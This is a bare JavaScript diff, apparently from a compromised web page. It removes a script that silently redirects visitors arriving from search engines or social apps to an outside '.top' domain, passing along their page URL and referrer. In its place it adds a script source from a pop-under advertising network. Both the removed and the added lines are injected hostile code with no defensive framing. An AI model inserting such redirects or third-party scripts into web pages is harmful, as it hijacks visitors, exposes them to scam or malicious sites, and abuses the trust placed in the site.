@@ -1,2 +1,1 @@
-var ars = 'https://mtsttfjq.top/khong-motma11-uvoHhJJdFhyy5qihdY6o';
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+src='//pl15746481.cpmprofitablenetwork.com/82/a9/e7/82a9e7600b786d799fe064dba95aae9b.js'
